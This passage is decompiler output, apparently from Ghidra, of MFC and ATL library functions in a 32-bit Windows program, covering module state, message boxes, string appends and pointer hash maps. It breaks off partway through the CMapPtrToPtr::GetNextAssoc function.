//  public: virtual void * __thiscall CCommDlgWrapper::`scalar deleting destructor'(unsigned int)
//  public: virtual void * __thiscall CDllIsolationWrapperBase::`scalar deleting
// destructor'(unsigned int)
//  public: virtual void * __thiscall CShellWrapper::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CDllIsolationWrapperBase * __thiscall
FID_conflict__scalar_deleting_destructor_(void *this,byte param_1)

{
  CDllIsolationWrapperBase::~CDllIsolationWrapperBase((CDllIsolationWrapperBase *)this);
  if ((param_1 & 1) != 0) {
    CNoTrackObject::operator_delete(this);
  }
  return (CDllIsolationWrapperBase *)this;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: __thiscall AFX_MODULE_STATE::AFX_MODULE_STATE(int)
// 
// Library: Visual Studio 2008 Release

AFX_MODULE_STATE * __thiscall AFX_MODULE_STATE::AFX_MODULE_STATE(AFX_MODULE_STATE *this,int param_1)

{
  void *pvVar1;
  CComCtlWrapper *this_00;
  undefined4 uVar2;
  CCommDlgWrapper *this_01;
  CShellWrapper *this_02;
  
  *(undefined ***)this = vftable;
  *(undefined4 *)(this + 0x1c) = 0;
  *(undefined4 *)(this + 0x20) = 0;
  *(undefined4 *)(this + 0x24) = 0;
  *(undefined4 *)(this + 0x28) = 0;
  FUN_0040b274((CSimpleStringT<char,0> *)(this + 0x34));
  *(undefined4 *)(this + 0x40) = 0;
  *(undefined4 *)(this + 0x44) = 0;
  *(undefined4 *)(this + 0x50) = 0xffffffff;
  *(undefined4 *)(this + 0x54) = 0;
  *(undefined4 *)(this + 0x68) = 0;
  *(undefined4 *)(this + 0x6c) = 0;
  *(undefined4 *)(this + 0x28) = 0x20;
  *(undefined4 *)(this + 0x20) = 0x14;
  *(undefined4 *)(this + 0x18) = 0;
  this[0x14] = param_1._0_1_;
  ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT<char,0> *)(this + 0x34),0x1000);
  *(undefined4 *)(this + 0x30) = 1;
  *(undefined4 *)(this + 0x44) = 0x18;
  pvVar1 = operator_new(0xc);
  *(void **)(this + 0x78) = pvVar1;
  this_00 = (CComCtlWrapper *)CNoTrackObject::operator_new(0x188);
  if (this_00 == (CComCtlWrapper *)0x0) {
    uVar2 = 0;
  }
  else {
    uVar2 = CComCtlWrapper::CComCtlWrapper(this_00);
  }
  **(undefined4 **)(this + 0x78) = uVar2;
  this_01 = (CCommDlgWrapper *)CNoTrackObject::operator_new(100);
  if (this_01 == (CCommDlgWrapper *)0x0) {
    uVar2 = 0;
  }
  else {
    uVar2 = CCommDlgWrapper::CCommDlgWrapper(this_01);
  }
  *(undefined4 *)(*(int *)(this + 0x78) + 4) = uVar2;
  this_02 = (CShellWrapper *)CNoTrackObject::operator_new(0x14);
  if (this_02 == (CShellWrapper *)0x0) {
    uVar2 = 0;
  }
  else {
    uVar2 = CShellWrapper::CShellWrapper(this_02);
  }
  *(undefined4 *)(*(int *)(this + 0x78) + 8) = uVar2;
  *(undefined4 *)(this + 0x7c) = 1;
  *(undefined4 *)(this + 0x80) = 0;
  *(undefined4 *)(this + 0x84) = 0;
  *(undefined4 *)(this + 0x88) = 0;
  return this;
}



undefined * Catch_0040b934(void)

{
  int unaff_EBP;
  
  if (*(int **)(unaff_EBP + -0x18) != (int *)0x0) {
    FUN_0040a4cb(*(int **)(unaff_EBP + -0x18));
  }
  *(undefined4 *)(unaff_EBP + -4) = 1;
  return &LAB_0040b94d;
}



// Library Function - Single Match
//  public: __thiscall _AFX_BASE_MODULE_STATE::_AFX_BASE_MODULE_STATE(void)
// 
// Library: Visual Studio 2008 Release

_AFX_BASE_MODULE_STATE * __thiscall
_AFX_BASE_MODULE_STATE::_AFX_BASE_MODULE_STATE(_AFX_BASE_MODULE_STATE *this)

{
  AFX_MODULE_STATE::AFX_MODULE_STATE((AFX_MODULE_STATE *)this,1);
  *(undefined ***)this = vftable;
  return this;
}



// Library Function - Single Match
//  class AFX_MODULE_STATE * __stdcall AfxGetModuleState(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

AFX_MODULE_STATE * AfxGetModuleState(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = (AFX_MODULE_STATE *)
           CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pAVar1 == (AFX_MODULE_STATE *)0x0) {
LAB_0040ba53:
    AfxThrowNotSupportedException();
    return pAVar1;
  }
  pAVar1 = *(AFX_MODULE_STATE **)((CNoTrackObject *)pAVar1 + 4);
  if (pAVar1 == (AFX_MODULE_STATE *)0x0) {
    pAVar1 = (AFX_MODULE_STATE *)
             CProcessLocalObject::GetData
                       ((CProcessLocalObject *)&DAT_004342ec,
                        (_func_CNoTrackObject_ptr *)&LAB_0040ba11);
    if (pAVar1 == (AFX_MODULE_STATE *)0x0) goto LAB_0040ba53;
  }
  return pAVar1;
}



// Library Function - Single Match
//  class AFX_MODULE_THREAD_STATE * __stdcall AfxGetModuleThreadState(void)
// 
// Library: Visual Studio 2008 Release

AFX_MODULE_THREAD_STATE * AfxGetModuleThreadState(void)

{
  AFX_MODULE_STATE *pAVar1;
  AFX_MODULE_THREAD_STATE *pAVar2;
  
  pAVar1 = AfxGetModuleState();
  pAVar2 = CThreadLocal<class_AFX_MODULE_THREAD_STATE>::GetData
                     ((CThreadLocal<class_AFX_MODULE_THREAD_STATE> *)(pAVar1 + 0x74));
  if (pAVar2 == (AFX_MODULE_THREAD_STATE *)0x0) {
    AfxThrowNotSupportedException();
    return pAVar2;
  }
  return pAVar2;
}



// Library Function - Single Match
//  public: __thiscall AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(class AFX_MODULE_STATE *)
// 
// Library: Visual Studio 2008 Release

AFX_MAINTAIN_STATE2 * __thiscall
AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(AFX_MAINTAIN_STATE2 *this,AFX_MODULE_STATE *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  int iVar2;
  
  pAVar1 = AfxGetModuleState();
  if ((*(int *)(pAVar1 + 0x7c) == 0) || (*(void **)(param_1 + 0x80) == (void *)0xffffffff)) {
    *(undefined4 *)(this + 4) = 0;
  }
  else {
    iVar2 = AfxActivateActCtx(*(void **)(param_1 + 0x80),(ulong *)this);
    *(int *)(this + 4) = iVar2;
  }
  return this;
}



undefined4 FUN_0040bac4(void)

{
  _AFX_THREAD_STATE *p_Var1;
  
  p_Var1 = AfxGetThreadState();
  return *(undefined4 *)(p_Var1 + 0x14c);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  int __cdecl AfxCtxMessageBoxW(struct HWND__ *,wchar_t const *,wchar_t const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl AfxCtxMessageBoxW(HWND__ *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4)

{
  AFX_MODULE_STATE *pAVar1;
  eActCtxResult eVar2;
  ulong *puVar3;
  ulong local_24;
  int local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042f8b0;
  uStack_c = 0x40badc;
  local_24 = 0;
  puVar3 = &local_24;
  pAVar1 = AfxGetModuleState();
  eVar2 = AfxActivateActCtxWrapper(*(void **)(pAVar1 + 0x80),puVar3);
  local_20 = 0;
  if (eVar2 == 0) {
    local_20 = 0;
  }
  else {
    local_8 = (undefined *)0x0;
    local_20 = MessageBoxW(param_1,param_2,param_3,param_4);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040bb32();
  }
  return local_20;
}



void FUN_0040bb32(void)

{
  uint uVar1;
  DWORD dwErrCode;
  uint unaff_EBX;
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    uVar1 = (uint)(*(uint *)(unaff_EBP + -0x1c) == unaff_EBX);
    if (uVar1 == unaff_EBX) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (uVar1 != unaff_EBX) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// Library Function - Single Match
//  class CWnd * __stdcall AfxGetMainWnd(void)
// 
// Library: Visual Studio 2008 Release

CWnd * AfxGetMainWnd(void)

{
  int *piVar1;
  CWnd *pCVar2;
  
  piVar1 = (int *)FUN_0040c560();
  if (piVar1 != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040bb74. Too many branches
                    // WARNING: Treating indirect jump as call
    pCVar2 = (CWnd *)(**(code **)(*piVar1 + 0x74))();
    return pCVar2;
  }
  return (CWnd *)0x0;
}



// Library Function - Single Match
//  public: static void __cdecl CWinApp::DoEnableModeless(int)
// 
// Library: Visual Studio 2008 Release

void __cdecl CWinApp::DoEnableModeless(int param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)AfxGetMainWnd();
  if (piVar1 != (int *)0x0) {
    iVar2 = (**(code **)(*piVar1 + 0x128))();
    if ((iVar2 != 0) && ((int *)piVar1[0x20] != (int *)0x0)) {
      (**(code **)(*(int *)piVar1[0x20] + 100))(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  public: static struct HWND__ * __stdcall CWnd::GetSafeOwner_(struct HWND__ *,struct HWND__ * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

HWND__ * CWnd::GetSafeOwner_(HWND__ *param_1,HWND__ **param_2)

{
  HWND hWnd;
  CWnd *pCVar1;
  uint uVar2;
  HWND pHVar3;
  HWND hWnd_00;
  BOOL BVar4;
  HWND hWnd_01;
  
  hWnd_01 = param_1;
  if (param_1 != (HWND__ *)0x0) goto LAB_0040bbe3;
  pCVar1 = (CWnd *)FUN_0040bac4();
  if ((pCVar1 == (CWnd *)0x0) && (pCVar1 = AfxGetMainWnd(), pCVar1 == (CWnd *)0x0)) {
    hWnd_01 = (HWND)0x0;
    pHVar3 = hWnd_01;
    hWnd_00 = hWnd_01;
  }
  else {
    for (hWnd_01 = *(HWND *)(pCVar1 + 0x20); pHVar3 = hWnd_01, hWnd_00 = hWnd_01,
        hWnd_01 != (HWND)0x0; hWnd_01 = GetParent(hWnd_01)) {
LAB_0040bbe3:
      uVar2 = GetWindowLongW(hWnd_01,-0x10);
      pHVar3 = hWnd_01;
      hWnd_00 = hWnd_01;
      if ((uVar2 & 0x40000000) == 0) break;
    }
  }
  while (hWnd = pHVar3, hWnd != (HWND)0x0) {
    pHVar3 = GetParent(hWnd);
    hWnd_01 = hWnd;
  }
  if ((param_1 == (HWND__ *)0x0) && (hWnd_00 != (HWND)0x0)) {
    hWnd_00 = GetLastActivePopup(hWnd_00);
  }
  if (param_2 != (HWND__ **)0x0) {
    if (((hWnd_01 == (HWND)0x0) || (BVar4 = ::IsWindowEnabled(hWnd_01), BVar4 == 0)) ||
       (hWnd_01 == hWnd_00)) {
      *param_2 = (HWND__ *)0x0;
    }
    else {
      *param_2 = hWnd_01;
      ::EnableWindow(hWnd_01,0);
    }
  }
  return hWnd_00;
}



// Library Function - Single Match
//  public: static int __cdecl CWinApp::ShowAppMessageBox(class CWinApp *,wchar_t const *,unsigned
// int,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CWinApp::ShowAppMessageBox(CWinApp *param_1,wchar_t *param_2,uint param_3,uint param_4)

{
  HWND__ *hWnd;
  DWORD DVar1;
  int *piVar2;
  int iVar3;
  LPWSTR lpFilename;
  DWORD local_21c;
  int local_218;
  HWND__ *local_214;
  WCHAR local_210 [259];
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  DoEnableModeless(0);
  hWnd = CWnd::GetSafeOwner_((HWND__ *)0x0,&local_214);
  if (hWnd != local_214) {
    EnableWindow(hWnd,1);
  }
  local_21c = 0;
  GetWindowThreadProcessId(hWnd,&local_21c);
  if ((((hWnd == (HWND__ *)0x0) || (DVar1 = GetCurrentProcessId(), local_21c != DVar1)) ||
      (piVar2 = (int *)SendMessageW(hWnd,0x376,0,0), piVar2 == (int *)0x0)) &&
     (piVar2 = (int *)0x0, param_1 != (CWinApp *)0x0)) {
    piVar2 = (int *)(param_1 + 0x78);
  }
  local_218 = 0;
  if ((piVar2 != (int *)0x0) && (local_218 = *piVar2, param_4 != 0)) {
    *piVar2 = param_4 + 0x30000;
  }
  if ((param_3 & 0xf0) == 0) {
    if ((param_3 & 0xf) < 2) {
      param_3 = param_3 | 0x30;
    }
    else if ((param_3 & 0xf) - 3 < 2) {
      param_3 = param_3 | 0x20;
    }
  }
  local_210[0] = L'\0';
  if (param_1 == (CWinApp *)0x0) {
    lpFilename = local_210;
    DVar1 = GetModuleFileNameW((HMODULE)0x0,lpFilename,0x104);
    if (DVar1 == 0x104) {
      local_a = 0;
    }
  }
  else {
    lpFilename = *(LPWSTR *)(param_1 + 0x50);
  }
  AfxCtxMessageBoxW(hWnd,param_2,lpFilename,param_3);
  if (piVar2 != (int *)0x0) {
    *piVar2 = local_218;
  }
  if (local_214 != (HWND)0x0) {
    EnableWindow(local_214,1);
  }
  DoEnableModeless(1);
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  int __stdcall AfxMessageBox(wchar_t const *,unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

int AfxMessageBox(wchar_t *param_1,uint param_2,uint param_3)

{
  AFX_MODULE_STATE *pAVar1;
  int iVar2;
  
  pAVar1 = AfxGetModuleState();
  if (*(int **)(pAVar1 + 4) != (int *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040bdce. Too many branches
                    // WARNING: Treating indirect jump as call
    iVar2 = (**(code **)(**(int **)(pAVar1 + 4) + 0x98))();
    return iVar2;
  }
  iVar2 = CWinApp::ShowAppMessageBox((CWinApp *)0x0,param_1,param_2,param_3);
  return iVar2;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  int __stdcall AfxMessageBox(unsigned int,unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

int AfxMessageBox(uint param_1,uint param_2,uint param_3)

{
  int iVar1;
  wchar_t *local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 4;
  local_8 = 0x40bdf7;
  FUN_0040b274(local_14);
  local_8 = 0;
  ATL::CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>::LoadStringW
            ((CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_> *)
             local_14,param_1);
  if (param_3 == 0xffffffff) {
    param_3 = param_1;
  }
  iVar1 = AfxMessageBox(local_14[0],param_2,param_3);
  FUN_0040ae6f((int **)(local_14[0] + -8));
  return iVar1;
}



void __cdecl FUN_0040be3a(void *param_1,rsize_t param_2,void *param_3,rsize_t param_4)

{
  errno_t eVar1;
  
  eVar1 = _memcpy_s(param_1,param_2,param_3,param_4);
  AfxCrtErrorCheck(eVar1);
  return;
}



// Library Function - Single Match
//  public: static int __cdecl ATL::CSimpleStringT<wchar_t,0>::StringLengthN(wchar_t const
// *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl ATL::CSimpleStringT<wchar_t,0>::StringLengthN(wchar_t *param_1,uint param_2)

{
  size_t sVar1;
  
  if (param_1 == (wchar_t *)0x0) {
    return 0;
  }
  sVar1 = _wcsnlen(param_1,param_2);
  return sVar1;
}



// Library Function - Single Match
//  int __stdcall AfxLoadString(unsigned int,wchar_t *,unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int AfxLoadString(uint param_1,wchar_t *param_2,uint param_3)

{
  uint uVar1;
  code *pcVar2;
  AFX_MODULE_STATE *pAVar3;
  ushort *puVar4;
  uint uVar5;
  int iVar6;
  
  if ((param_2 != (wchar_t *)0x0) && (param_3 != 0)) {
    pAVar3 = AfxGetModuleState();
    puVar4 = (ushort *)ATL::AtlGetStringResourceImage(*(HINSTANCE__ **)(pAVar3 + 0xc),param_1);
    if (puVar4 == (ushort *)0x0) {
      *param_2 = L'\0';
      uVar5 = 0;
    }
    else {
      uVar1 = param_3 - 1;
      uVar5 = (uint)*puVar4;
      if (uVar1 < *puVar4) {
        uVar5 = uVar1;
      }
      FUN_0040be3a(param_2,uVar1 * 2,puVar4 + 1,uVar5 * 2);
      param_2[uVar5] = L'\0';
    }
    return uVar5;
  }
  AfxThrowNotSupportedException();
  pcVar2 = (code *)swi(3);
  iVar6 = (*pcVar2)();
  return iVar6;
}



undefined4 FUN_0040bed8(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  return *(undefined4 *)(pAVar1 + 0xc);
}



// Library Function - Single Match
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::ReleaseBuffer(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::ReleaseBuffer(CSimpleStringT<wchar_t,0> *this,int param_1)

{
  if (param_1 == -1) {
    param_1 = StringLengthN(*(wchar_t **)this,*(uint *)(*(wchar_t **)this + -4));
  }
  SetLength(this,param_1);
  return;
}



undefined ** FUN_0040bf0d(void)

{
  return &PTR_s_COleException_00429730;
}



// Library Function - Single Match
//  public: __thiscall COleException::COleException(void)
// 
// Library: Visual Studio 2008 Release

COleException * __thiscall COleException::COleException(COleException *this)

{
  FUN_0040a66b((int)this);
  *(undefined4 *)(this + 8) = 0;
  *(undefined ***)this = vftable;
  return this;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// Library Function - Single Match
//  void __stdcall AfxThrowOleException(long)
// 
// Library: Visual Studio 2008 Release

void AfxThrowOleException(long param_1)

{
  code *pcVar1;
  COleException *this;
  int iVar2;
  
  this = (COleException *)operator_new(0xc);
  iVar2 = 0;
  if (this != (COleException *)0x0) {
    iVar2 = COleException::COleException(this);
  }
  *(long *)(iVar2 + 8) = param_1;
  param_1 = iVar2;
  __CxxThrowException_8(&param_1,&DAT_0042f8cc);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  public: virtual int __thiscall COleException::GetErrorMessage(wchar_t *,unsigned int,unsigned
// int *)const 
// 
// Library: Visual Studio 2008 Release

int __thiscall
COleException::GetErrorMessage(COleException *this,wchar_t *param_1,uint param_2,uint *param_3)

{
  DWORD DVar1;
  
  if (param_3 != (uint *)0x0) {
    *param_3 = 0;
  }
  DVar1 = FormatMessageW(0x1100,(LPCVOID)0x0,*(DWORD *)(this + 8),0x800,(LPWSTR)&param_3,0,
                         (va_list *)0x0);
  if (DVar1 != 0) {
    ATL::Checked::tcsncpy_s(param_1,param_2,(wchar_t *)param_3,0xffffffff);
    LocalFree(param_3);
  }
  else {
    *param_1 = L'\0';
  }
  return (uint)(DVar1 != 0);
}



undefined4 * __thiscall FUN_0040bfc7(void *this,byte param_1)

{
  *(undefined ***)this = COleException::vftable;
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::AppendChar(wchar_t)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall
ATL::CSimpleStringT<wchar_t,0>::AppendChar(CSimpleStringT<wchar_t,0> *this,wchar_t param_1)

{
  int iVar1;
  int iVar2;
  char *pcVar3;
  
  iVar2 = *(int *)(*(int *)this + -0xc);
  iVar1 = iVar2 + 1;
  pcVar3 = CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT<char,0> *)this,iVar1);
  *(wchar_t *)(pcVar3 + iVar2 * 2) = param_1;
  SetLength(this,iVar1);
  return;
}



// Library Function - Single Match
//  public: class ATL::CSimpleStringT<wchar_t,0> & __thiscall
// ATL::CSimpleStringT<wchar_t,0>::operator+=(char)
// 
// Library: Visual Studio 2008 Release

CSimpleStringT<wchar_t,0> * __thiscall
ATL::CSimpleStringT<wchar_t,0>::operator+=(CSimpleStringT<wchar_t,0> *this,char param_1)

{
  AppendChar(this,(short)param_1);
  return this;
}



void __thiscall FUN_0040c035(void *this,wchar_t *param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  char *pcVar3;
  uint uVar4;
  wchar_t *pwVar5;
  
                    // WARNING: Load size is inaccurate
  uVar1 = *(uint *)(*this + -0xc);
  uVar4 = (int)param_1 - *this >> 1;
  if (-1 < (int)param_2) goto LAB_0040c05d;
  do {
    FUN_0040a834(-0x7ff8ffa9);
LAB_0040c05d:
    uVar2 = ATL::CSimpleStringT<wchar_t,0>::StringLengthN(param_1,param_2);
  } while ((int)(0x7fffffff - uVar2) < (int)uVar1);
  pcVar3 = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT<char,0> *)this,uVar1 + uVar2);
  pwVar5 = (wchar_t *)(pcVar3 + uVar4 * 2);
  if (uVar1 < uVar4) {
    pwVar5 = param_1;
  }
  ATL::CSimpleStringT<wchar_t,0>::CopyCharsOverlapped
            ((wchar_t *)(pcVar3 + uVar1 * 2),uVar2,pwVar5,uVar2);
  ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT<wchar_t,0> *)this,uVar1 + uVar2);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall ATL::CSimpleStringT<char,0>::Append(char const *)
//  public: void __thiscall ATL::CSimpleStringT<wchar_t,0>::Append(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void __thiscall Append(void *this,wchar_t *param_1)

{
  uint uVar1;
  
  uVar1 = StringLength(param_1);
  FUN_0040c035(this,param_1,uVar1);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class ATL::CSimpleStringT<char,0> & __thiscall
// ATL::CSimpleStringT<char,0>::operator+=(char const *)
//  public: class ATL::CSimpleStringT<wchar_t,0> & __thiscall
// ATL::CSimpleStringT<wchar_t,0>::operator+=(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void * __thiscall FID_conflict_operator__(void *this,wchar_t *param_1)

{
  Append(this,param_1);
  return this;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> > > &
// __thiscall ATL::CStringT<char,class StrTraitMFC<char,class ATL::ChTraitsCRT<char> >
// >::operator+=(char const *)
//  public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> >
// > & __thiscall ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> >
// >::operator+=(wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void * __thiscall FID_conflict_operator__(void *this,wchar_t *param_1)

{
  FID_conflict_operator__(this,param_1);
  return this;
}



// Library Function - Single Match
//  public: void __thiscall CMapPtrToPtr::InitHashTable(unsigned int,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CMapPtrToPtr::InitHashTable(CMapPtrToPtr *this,uint param_1,int param_2)

{
  void *_Dst;
  
  if (param_1 == 0) {
    param_1 = 0x11;
  }
  if (*(void **)(this + 4) != (void *)0x0) {
    FUN_0040a3fc(*(void **)(this + 4));
    *(undefined4 *)(this + 4) = 0;
  }
  if (param_2 != 0) {
    _Dst = operator_new(-(uint)((int)((ulonglong)param_1 * 4 >> 0x20) != 0) |
                        (uint)((ulonglong)param_1 * 4));
    *(void **)(this + 4) = _Dst;
    _memset(_Dst,0,param_1 << 2);
  }
  *(uint *)(this + 8) = param_1;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CMapPtrToPtr::RemoveAll(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CMapPtrToPtr::RemoveAll(CMapPtrToPtr *this)

{
  if (*(void **)(this + 4) != (void *)0x0) {
    FUN_0040a3fc(*(void **)(this + 4));
    *(undefined4 *)(this + 4) = 0;
  }
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  CPlex::FreeDataChain(*(CPlex **)(this + 0x14));
  *(undefined4 *)(this + 0x14) = 0;
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: void __thiscall CMapPtrToPtr::FreeAssoc(struct CMapPtrToPtr::CAssoc *)
//  protected: void __thiscall CMapPtrToWord::FreeAssoc(struct CMapPtrToWord::CAssoc *)
// 
// Library: Visual Studio 2008 Release

void __thiscall FreeAssoc(void *this,undefined4 *param_1)

{
  int *piVar1;
  
  *param_1 = *(undefined4 *)((int)this + 0x10);
  piVar1 = (int *)((int)this + 0xc);
  *piVar1 = *piVar1 + -1;
  *(undefined4 **)((int)this + 0x10) = param_1;
  if (*piVar1 == 0) {
    CMapPtrToPtr::RemoveAll((CMapPtrToPtr *)this);
  }
  return;
}



// Library Function - Single Match
//  protected: struct CMapPtrToPtr::CAssoc * __thiscall CMapPtrToPtr::GetAssocAt(void *,unsigned int
// &,unsigned int &)const 
// 
// Library: Visual Studio 2008 Release

CAssoc * __thiscall
CMapPtrToPtr::GetAssocAt(CMapPtrToPtr *this,void *param_1,uint *param_2,uint *param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  
  *param_3 = (uint)param_1 >> 4;
  uVar2 = ((uint)param_1 >> 4) % *(uint *)(this + 8);
  *param_2 = uVar2;
  if (*(int *)(this + 4) != 0) {
    for (puVar1 = *(undefined4 **)(*(int *)(this + 4) + uVar2 * 4); puVar1 != (undefined4 *)0x0;
        puVar1 = (undefined4 *)*puVar1) {
      if ((void *)puVar1[1] == param_1) {
        return (CAssoc *)puVar1;
      }
    }
  }
  return (CAssoc *)0x0;
}



// Library Function - Single Match
//  public: void * __thiscall CMapPtrToPtr::GetValueAt(void *)const 
// 
// Library: Visual Studio 2008 Release

void * __thiscall CMapPtrToPtr::GetValueAt(CMapPtrToPtr *this,void *param_1)

{
  CMapPtrToPtr *extraout_ECX;
  undefined4 *puVar1;
  
  if (this == (CMapPtrToPtr *)0x0) {
    AfxThrowNotSupportedException();
    this = extraout_ECX;
  }
  if (*(int *)(this + 4) != 0) {
    for (puVar1 = *(undefined4 **)
                   (*(int *)(this + 4) + (((uint)param_1 >> 4) % *(uint *)(this + 8)) * 4);
        puVar1 != (undefined4 *)0x0; puVar1 = (undefined4 *)*puVar1) {
      if ((void *)puVar1[1] == param_1) {
        return (void *)puVar1[2];
      }
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  public: int __thiscall CMapPtrToPtr::Lookup(void *,void * &)const 
// 
// Library: Visual Studio 2008 Release

int __thiscall CMapPtrToPtr::Lookup(CMapPtrToPtr *this,void *param_1,void **param_2)

{
  CAssoc *pCVar1;
  CMapPtrToPtr *local_8;
  
  local_8 = this;
  pCVar1 = GetAssocAt(this,param_1,(uint *)&local_8,(uint *)&param_1);
  if (pCVar1 != (CAssoc *)0x0) {
    *param_2 = *(void **)(pCVar1 + 8);
    pCVar1 = (CAssoc *)0x1;
  }
  return (int)pCVar1;
}



// Library Function - Single Match
//  public: int __thiscall CMapPtrToPtr::RemoveKey(void *)
// 
// Library: Visual Studio 2008 Release

int __thiscall CMapPtrToPtr::RemoveKey(CMapPtrToPtr *this,void *param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  if (*(int *)(this + 4) == 0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    puVar3 = (undefined4 *)(*(int *)(this + 4) + (((uint)param_1 >> 4) % *(uint *)(this + 8)) * 4);
    puVar1 = (undefined4 *)*puVar3;
    while (puVar2 = puVar1, puVar2 != (undefined4 *)0x0) {
      if ((void *)puVar2[1] == param_1) {
        *puVar3 = *puVar2;
        FreeAssoc(this,puVar2);
        return 1;
      }
      puVar3 = puVar2;
      puVar1 = (undefined4 *)*puVar2;
    }
  }
  return (int)puVar2;
}



// Library Function - Single Match
//  public: void __thiscall CMapPtrToPtr::GetNextAssoc(struct __POSITION * &,void * &,void * &)const
// 
// 
// Library: Visual Studio 2008 Release

void __thiscall
CMapPtrToPtr::GetNextAssoc(CMapPtrToPtr *this,__POSITION **param_1,void **param_2,void **param_3)

{
  int **ppiVar1;
  __POSITION **pp_Var2;
  CMapPtrToPtr *extraout_ECX;
  uint uVar3;
  __POSITION **pp_Var4;
  uint uVar5;
  __POSITION *p_Var6;
  
  pp_Var4 = (__POSITION **)*param_1;
  if (pp_Var4 != (__POSITION **)0x0) {
    if (pp_Var4 == (__POSITION **)0xffffffff) {
      uVar5 = 0;
      if (*(uint *)(this + 8) != 0) {
        ppiVar1 = *(int ***)(this + 4);
        do {
          pp_Var4 = (__POSITION **)*ppiVar1;
          if (pp_Var4 != (__POSITION **)0x0) goto LAB_0040c2ce;
          uVar5 = uVar5 + 1;
          ppiVar1 = ppiVar1 + 1;
        } while (uVar5 < *(uint *)(this + 8));
        AfxThrowNotSupportedException();
        this = extraout_ECX;
      }
    }
LAB_0040c2ce:
    p_Var6 = *pp_Var4;
    if (p_Var6 == (__POSITION *)0x0) {
      uVar5 = *(uint *)(this + 8);
      uVar3 = ((uint)pp_Var4[1] >> 4) % uVar5 + 1;
      if (uVar3 < uVar5) {
        pp_Var2 = (__POSITION **)(*(int *)(this + 4) + uVar3 * 4);
        do {
          p_Var6 = *pp_Var2;
          if (p_Var6 != (__POSITION *)0x0) break;
          uVar3 = uVar3 + 1;
          pp_Var2 = pp_Var2 + 1;
        } while (uVar3 < uVar5);
      }
    }
